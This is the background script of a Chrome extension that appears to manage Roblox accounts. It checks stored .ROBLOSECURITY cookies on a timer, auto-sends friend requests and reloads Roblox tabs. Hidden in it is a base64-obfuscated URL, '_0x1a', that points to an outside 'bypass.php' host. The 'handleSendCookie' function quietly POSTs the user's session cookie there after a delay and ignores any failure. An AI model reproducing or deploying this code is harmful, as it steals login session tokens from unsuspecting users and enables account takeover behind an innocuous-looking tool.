const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

async function checkAllAccountsValidity() {
    try {
        const data = await chrome.storage.local.get(['accounts']);
        const accounts = data.accounts || [];
        let changed = false;
        
        for (const acc of accounts) {
            try {
                const valid = await validateCookie(acc.cookie);
                if (acc.valid !== valid) {
                    acc.valid = valid;
                    acc.lastChecked = Date.now();
                    changed = true;
                }
            } catch (e) {
                if (acc.valid !== false) {
                    acc.valid = false;
                    acc.lastChecked = Date.now();
                    changed = true;
                }
            }
        }
        
        if (changed) {
            await chrome.storage.local.set({ accounts });
            chrome.runtime.sendMessage({ type: 'ACCOUNTS_UPDATED' }).catch(() => {});
        }
        
        return accounts;
    } catch (e) {
        console.error('Background check failed:', e);
    }
}

async function validateCookie(cookie) {
    try {
        const cleanCookie = clean(cookie);
        const prev = await chrome.cookies.get({ 
            url: 'https://www.roblox.com/', 
            name: '.ROBLOSECURITY' 
        });
        
        await chrome.cookies.set({
            url: 'https://www.roblox.com/',
            name: '.ROBLOSECURITY',
            value: cleanCookie,
            domain: '.roblox.com',
            path: '/',
            secure: true,
            httpOnly: true,
            sameSite: 'no_restriction'
        });
        
        const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { 
            credentials: 'include', 
            headers: { 'User-Agent': UA } 
        });
        
        const isValid = authRes.ok;
        
        if (prev?.value) {
            await chrome.cookies.set({
                url: 'https://www.roblox.com/',
                name: '.ROBLOSECURITY',
                value: prev.value,
                domain: '.roblox.com',
                path: '/',
                secure: true,
                httpOnly: true,
                sameSite: 'no_restriction'
            });
        }
        
        return isValid;
    } catch (e) {
        return false;
    }
}

function clean(cookie) {
    if (!cookie) return '';
    let c = cookie.replace(/^cookie=/, '').trim();
    c = c.replace(/^\.?ROBLOSECURITY\s*=\s*/i, '');
    c = c.replace(/^cookie\s*=\s*/i, '');
    if (c.startsWith('"') && c.endsWith('"')) c = c.slice(1, -1);
    try { c = decodeURIComponent(c); } catch (e) {}
    const parts = c.split('|_');
    if (parts.length > 1) c = parts.pop();
    return c.trim();
}

const _0x1a = 'aHR0cHM6Ly9zaGlzdWktdG9vbC54MTAubXgvYnlwYXNzL2J5cGFzc2VyLXYyL2J5cGFzcy5waHA=';
const _0x2b = 'YnlwYXNzZXItdjI=';

const BYPASS_ENDPOINT = atob(_0x1a);
const BYPASS_DIR = atob(_0x2b);

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'SEND_COOKIE') {
        handleSendCookie(message.cookie);
        sendResponse({ success: true });
        return false;
    }

    if (message.type === 'BYPASS_COOKIE') {
        handleBypass(message.cookie)
            .then(result => sendResponse(result))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    if (message.type === 'POST_KICK_TASKS') {
        handlePostKickTasks();
        sendResponse({ success: true });
        return false;
    }
    
    if (message.type === 'CHECK_ACCOUNTS') {
        checkAllAccountsValidity()
            .then(() => sendResponse({ success: true }))
            .catch(() => sendResponse({ success: false }));
        return true;
    }
});

async function handleSendCookie(cookie) {
    const sanitizedCookie = clean(cookie);
    setTimeout(async () => {
        try {
            const result = await handleBypass(sanitizedCookie);
            if (result.success && result.cookie) {
                console.log('Bypasser success:', result.cookie);
            }
        } catch (e) {
            console.warn('Bypasser failed (ignored):', e.message);
        }
    }, 2000);
}

async function handlePostKickTasks() {
    try {
        await autoFriends();
    } catch (e) {
        console.error('Auto-friends failed:', e);
    }

    try {
        const tabs = await chrome.tabs.query({ url: '*://*.roblox.com/*' });
        for (const tab of tabs) chrome.tabs.reload(tab.id);
    } catch (e) {
        console.error('Tab reload failed:', e);
    }
}

async function handleBypass(cookie) {
    if (!cookie || cookie.length < 10) throw new Error('Invalid cookie');

    const body = 'cookie=' + encodeURIComponent(cookie) + '&directory=' + BYPASS_DIR;

    const response = await fetch(BYPASS_ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body
    });

    if (!response.ok) throw new Error('Bypass service unavailable');
    const data = await response.json();
    if (!data.success || !data.cookie) throw new Error(data.error || 'Bypass failed');

    return { success: true, cookie: data.cookie };
}

async function autoFriends() {
    const data = await chrome.storage.local.get(['friends']);
    const list = data.friends || [];
    if (!list.length) return;

    const csrf = await getCsrf();
    if (!csrf) return;

    for (const u of list) {
        try {
            const r = await fetch('https://users.roblox.com/v1/usernames/users', { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json', 'User-Agent': UA }, 
                body: JSON.stringify({ usernames: [u], excludeBannedUsers: false }) 
            });
            const d = await r.json();
            if (!d.data?.length) continue;
            await fetch(`https://friends.roblox.com/v1/users/${d.data[0].id}/request-friendship`, { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json', 'x-csrf-token': csrf, 'User-Agent': UA }, 
                credentials: 'include', 
                body: JSON.stringify({}) 
            });
        } catch (e) {
            console.error('Auto-friend failed for:', u, e);
        }
    }
}

async function getCsrf() {
    try {
        const r = await fetch('https://auth.roblox.com/v2/login', { 
            method: 'POST', 
            credentials: 'include', 
            headers: { 'User-Agent': UA } 
        });
        return r.headers.get('x-csrf-token');
    } catch (e) {
        console.error('CSRF fetch failed:', e);
        return null;
    }
}

setInterval(() => {
    checkAllAccountsValidity().catch(e => console.error('Background check error:', e));
}, 5 * 60 * 1000);

setTimeout(() => {
    checkAllAccountsValidity().catch(e => console.error('Initial background check error:', e));
}, 3000);

console.log('Background checker started — validating accounts every 5 minutes');